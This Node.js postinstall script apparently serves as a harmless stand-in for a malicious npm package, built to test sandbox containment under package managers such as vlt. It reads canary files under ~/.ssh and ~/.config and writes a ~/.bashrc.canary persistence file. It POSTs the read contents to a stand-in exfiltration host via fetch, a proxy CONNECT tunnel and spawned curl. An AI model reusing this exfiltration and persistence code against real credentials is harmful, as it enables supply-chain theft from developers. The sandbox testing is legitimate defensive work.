#!/usr/bin/env node
// Harmless hostile-postinstall stand-in. Every attempt is keyed off $HOME and the
// project directory, and every outcome is appended as one JSON line to
// <project>/canary-attempts.log. <project> is INIT_CWD when the client sets it (npm,
// pnpm, bun via npm rebuild), else the nearest dir above node_modules, else the cwd:
// vlt runs a file: directory dependency in its own real directory and sets no
// INIT_CWD, so under vlt the log lands in evil-pkg/. It never prints secret values:
// reads record only whether they succeeded and how many bytes came back.
// Attempts: read two canary files in HOME, write $HOME/.bashrc.canary, POST the
// canary to two hosts three ways (fetch, CONNECT through $HTTPS_PROXY, spawned
// curl), stage a file in /tmp (removed again), write inside the project.
//
// Safety: when $HOME is the real home of the current OS user (from /etc/passwd),
// the HOME write and the network POSTs are skipped, so running this by accident
// outside a test cannot touch real dotfiles or send anything.
"use strict";

const fs = require("node:fs");
const os = require("node:os");
const path = require("node:path");
const http = require("node:http");
const tls = require("node:tls");
const { spawnSync } = require("node:child_process");

const TIMEOUT_MS = 5000;
const TARGETS = ["https://exfil.invalid.example/", "https://registry.yarnpkg.com/-/canary"];

const home = process.env.HOME || "";
let realHome = "";
try {
  realHome = os.userInfo().homedir;
} catch {
  realHome = "";
}
const safeHome = home !== "" && path.resolve(home) !== path.resolve(realHome || "/nonexistent-real-home");

// Project directory: npm sets INIT_CWD; otherwise walk up out of node_modules; otherwise cwd.
const projectDir = (() => {
  if (process.env.INIT_CWD) return process.env.INIT_CWD;
  let d = process.cwd();
  while (d !== path.dirname(d)) {
    if (path.basename(d) === "node_modules") return path.dirname(d);
    d = path.dirname(d);
  }
  return process.env.PWD || process.cwd();
})();
const logFile = path.join(projectDir, "canary-attempts.log");

const records = [];
const record = (step, target, ok, detail) => {
  const line = JSON.stringify({ ts: new Date().toISOString(), step, target, ok, detail });
  records.push(line);
  try {
    fs.appendFileSync(logFile, `${line}\n`);
  } catch (e) {
    // The log itself may be unwritable under a strict sandbox; stdout still carries it.
    process.stdout.write(`[evil-pkg] log write failed (${e.code}): ${line}\n`);
  }
};

const errDetail = (e) => ({ error: e && (e.code || e.name || "Error"), message: String((e && e.message) || e).slice(0, 200) });

// Context: names only, never values.
const tokenish = Object.keys(process.env).filter((k) => /TOKEN|SECRET|_KEY|PASSWORD|AUTH/i.test(k)).sort();
record("context", "env", true, {
  cwd: process.cwd(),
  projectDir,
  home,
  safeHome,
  tokenEnvNames: tokenish,
  lifecycleEnvNames: Object.keys(process.env).filter((k) => /^(npm_|INIT_CWD$|VLT_|NONO_)/.test(k)).sort(),
  vltTokenPresent: typeof process.env.VLT_TOKEN === "string" && process.env.VLT_TOKEN.length > 0,
  httpsProxySet: Boolean(process.env.HTTPS_PROXY || process.env.https_proxy),
});

// (1) read canary secrets from HOME
let stolen = "";
for (const rel of [".ssh/id_canary", ".config/vlt-lab-canary/token"]) {
  const p = path.join(home, rel);
  try {
    const data = fs.readFileSync(p, "utf8");
    stolen += data;
    record("read-home-secret", p, true, { bytes: Buffer.byteLength(data) });
  } catch (e) {
    record("read-home-secret", p, false, errDetail(e));
  }
}

// (2) write into HOME (persistence vector)
{
  const p = path.join(home, ".bashrc.canary");
  if (!safeHome) {
    record("write-home", p, false, { skipped: "HOME is the real user home; refusing to write" });
  } else {
    try {
      fs.writeFileSync(p, "# vlt-lab canary: a postinstall script wrote this file\n");
      record("write-home", p, true, {});
    } catch (e) {
      record("write-home", p, false, errDetail(e));
    }
  }
}

const payload = JSON.stringify({ canary: stolen.length > 0 ? stolen.trim() : "(nothing read)" });

// (3a) direct HTTPS POST with global fetch (Node 22 fetch does not read HTTPS_PROXY)
const directPost = async (url) => {
  const ac = new AbortController();
  const t = setTimeout(() => ac.abort(), TIMEOUT_MS);
  try {
    const r = await fetch(url, { method: "POST", body: payload, signal: ac.signal, headers: { "content-type": "application/json" } });
    return { ok: true, detail: { status: r.status } };
  } catch (e) {
    return { ok: false, detail: errDetail(e.cause || e) };
  } finally {
    clearTimeout(t);
  }
};

// (3b) HTTPS POST tunnelled through whatever HTTPS_PROXY says (nono's proxy inside the sandbox)
const proxiedPost = (url) =>
  new Promise((resolve) => {
    const proxyEnv = process.env.HTTPS_PROXY || process.env.https_proxy;
    if (!proxyEnv) return resolve({ ok: false, detail: { skipped: "HTTPS_PROXY not set" } });
    const proxy = new URL(proxyEnv);
    const target = new URL(url);
    const headers = { Host: `${target.hostname}:443` };
    if (proxy.username) {
      headers["Proxy-Authorization"] = `Basic ${Buffer.from(`${decodeURIComponent(proxy.username)}:${decodeURIComponent(proxy.password)}`).toString("base64")}`;
    }
    const done = (r) => {
      clearTimeout(timer);
      resolve(r);
    };
    const timer = setTimeout(() => done({ ok: false, detail: { error: "TIMEOUT" } }), TIMEOUT_MS);
    const req = http.request({ host: proxy.hostname, port: proxy.port || 80, method: "CONNECT", path: `${target.hostname}:443`, headers });
    req.on("connect", (res, socket) => {
      if (res.statusCode !== 200) {
        socket.destroy();
        return done({ ok: false, detail: { connectStatus: res.statusCode } });
      }
      const s = tls.connect({ socket, servername: target.hostname }, () => {
        s.write(
          `POST ${target.pathname} HTTP/1.1\r\nHost: ${target.hostname}\r\nContent-Type: application/json\r\nContent-Length: ${Buffer.byteLength(payload)}\r\nConnection: close\r\n\r\n${payload}`,
        );
      });
      let buf = "";
      s.on("data", (d) => {
        buf += d.toString("latin1");
        const m = buf.match(/^HTTP\/1\.[01] (\d{3})/);
        if (m) {
          s.destroy();
          done({ ok: true, detail: { connectStatus: 200, status: Number(m[1]) } });
        }
      });
      s.on("error", (e) => done({ ok: false, detail: { connectStatus: 200, ...errDetail(e) } }));
    });
    req.on("error", (e) => done({ ok: false, detail: errDetail(e) }));
    req.end();
  });

// (4) spawn curl (honours HTTPS_PROXY on its own)
const curlPost = (url) => {
  const r = spawnSync("curl", ["-sS", "-m", String(TIMEOUT_MS / 1000), "-o", "/dev/null", "-w", "%{http_code}", "-X", "POST", "--data-binary", "@-", url], {
    input: payload,
    encoding: "utf8",
    timeout: TIMEOUT_MS + 2000,
  });
  if (r.error) return { ok: false, detail: errDetail(r.error) };
  const code = Number(r.stdout || 0);
  return {
    // curl prints 000 when no HTTP response came back; a proxy 403 shows up as exit 56 with code 403 on CONNECT
    ok: r.status === 0 && code > 0,
    detail: { exit: r.status, httpCode: code, stderr: (r.stderr || "").trim().slice(0, 200) },
  };
};

const main = async () => {
  for (const url of TARGETS) {
    if (!safeHome) {
      record("http-post-direct", url, false, { skipped: "HOME is the real user home; refusing network" });
      continue;
    }
    const a = await directPost(url);
    record("http-post-direct", url, a.ok, a.detail);
    const b = await proxiedPost(url);
    record("http-post-proxy", url, b.ok, b.detail);
    const c = curlPost(url);
    record("spawn-curl", url, c.ok, c.detail);
  }

  // (5b) stage a file in the shared /tmp (a drop point other processes can pick up); removed again on success
  {
    const p = path.join("/tmp", `vlt-lab-canary-${process.pid}.txt`);
    let wrote = false;
    try {
      fs.writeFileSync(p, "evil-pkg staged this in /tmp\n");
      wrote = true;
    } catch (e) {
      record("write-tmp", p, false, errDetail(e));
    }
    if (wrote) {
      let removed = true;
      try {
        fs.unlinkSync(p);
      } catch {
        removed = false;
      }
      record("write-tmp", p, true, { removed });
    }
  }

  // (5) write inside the project (expected to be allowed)
  {
    const p = path.join(projectDir, "canary-project-write.txt");
    try {
      fs.writeFileSync(p, "evil-pkg postinstall wrote inside the project\n");
      record("write-project", p, true, {});
    } catch (e) {
      record("write-project", p, false, errDetail(e));
    }
  }
  process.stdout.write(`[evil-pkg] ${records.length} attempts logged to ${logFile}\n`);
};

main().catch((e) => {
  record("fatal", "main", false, errDetail(e));
});
